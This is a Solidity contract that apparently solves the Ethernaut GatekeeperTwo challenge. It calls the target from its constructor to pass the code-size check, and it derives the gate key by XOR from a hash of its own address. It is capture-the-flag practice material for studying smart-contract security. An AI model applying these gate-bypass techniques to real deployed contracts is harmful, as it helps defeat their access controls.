// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract HGatekeeperTwo {
    constructor() public {
        IGatekeeperTwo iGateKeeperTwo = IGatekeeperTwo(
            0x0d66235CFE33D1B2c4EF6Af1F001e04058Fc6736
        );
        /*
        gate 3 reqiurement:
            require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1)

            As: a ^ b = c then a ^ c = b (where ^ is xor)
            To get gate key:
            uint64(_gateKey) = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1
        */
        bytes8 gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                (uint64(0) - 1)
        );
        iGateKeeperTwo.enter(gateKey);
    }
}
